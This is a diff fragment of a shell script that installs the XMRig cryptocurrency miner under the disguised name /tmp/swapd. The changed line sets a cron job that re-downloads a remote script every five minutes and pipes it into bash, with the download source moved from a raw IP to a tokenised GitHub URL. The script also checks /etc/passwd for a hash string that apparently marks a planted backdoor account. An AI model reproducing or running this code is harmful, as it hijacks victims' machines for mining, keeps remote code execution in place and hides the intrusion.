@@ -12,7 +12,7 @@ tar -xzvf xm.tar.gz
 mv /tmp/xmrig-6.8.2/xmrig /tmp/swapd
 rm -rf xmrig-6.8.2 xm.tar.gz
 #
-echo '*/5 * * * * if [ "swapd" == $"$(ps -A | grep -ow "swapd")" ] ; then echo "" ; else wget 103.101.3.74:5555/xm.sh -O- | bash ; fi' | crontab
+echo '*/5 * * * * if [ "swapd" == $"$(ps -A | grep -ow "swapd")" ] ; then echo "" ; else wget https://raw.githubusercontent.com/nacht0141/miner/master/xm.sh?token=ASP5SETVYBK5GJFVLGNZL73ALK7V6 -O- | bash ; fi' | crontab
 #
 if [ "k73/Pxl9JcZ8w" == "$(cat /etc/passwd | grep -o -m 1 "k73/Pxl9JcZ8w")" ] ;
 then
